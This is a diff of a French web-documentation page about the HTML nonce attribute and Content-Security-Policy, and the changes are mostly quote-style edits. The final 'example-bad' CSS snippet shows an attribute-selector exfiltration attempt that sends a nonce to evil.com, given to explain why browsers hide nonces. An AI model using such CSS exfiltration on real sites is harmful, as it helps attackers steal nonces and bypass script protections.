@@ -25,8 +25,8 @@ Plusieurs étapes sont nécessaires afin d'utiliser un nonce pour autoriser un s
 Sur le serveur web, générez une chaîne de caractères encodées en base64 à partir de 128 bits de données générés par un générateur de nombres aléatoires cryptographique. Les nonces doivent être générés différemment à chaque chargement de la page. En Node.js par exemple, on pourra écrire&nbsp;:
 
 ```js
-const crypto = require('crypto');
-crypto.randomBytes(16).toString('base64');
+const crypto = require("crypto");
+crypto.randomBytes(16).toString("base64");
 // '8IBTHwOdqNKAWeKl7plt8g=='
 ```
 
@@ -35,7 +35,9 @@ crypto.randomBytes(16).toString('base64');
 Le nonce généré côté serveur peut ensuite être utilisé sur le script embarqué qu'on souhaite autoriser&nbsp;:
 
 ```html
-<script nonce="8IBTHwOdqNKAWeKl7plt8g==">…</script>
+<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
+  …
+</script>
 ```
 
 #### Envoyer le nonce avec un en-tête CSP
@@ -51,7 +53,7 @@ Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
 Pour des raisons de sécurité, le contenu de l'attribut `nonce` est masqué (c'est une chaîne vide qui sera renvoyé).
 
 ```js example-bad
-script.getAttribute('nonce'); // renvoie la chaîne vide
+script.getAttribute("nonce"); // renvoie la chaîne vide
 ```
 
 La propriété [`nonce`](/fr/docs/Web/API/HTMLElement/nonce) est la seule façon d'accéder aux nonces&nbsp;:
@@ -63,7 +65,7 @@ script.nonce; // renvoie la valeur du nonce
 Un tel masquage empêche des acteurs malveillants d'exfiltrer les données du nonce grâce à des mécanismes qui permettent d'accéder aux attributs comme&nbsp;:
 
 ```css example-bad
-script[nonce~=peuimporte] {
+script[nonce~="peuimporte"] {
   background: url("https://evil.com/nonce?peuimporte");
 }
 ```
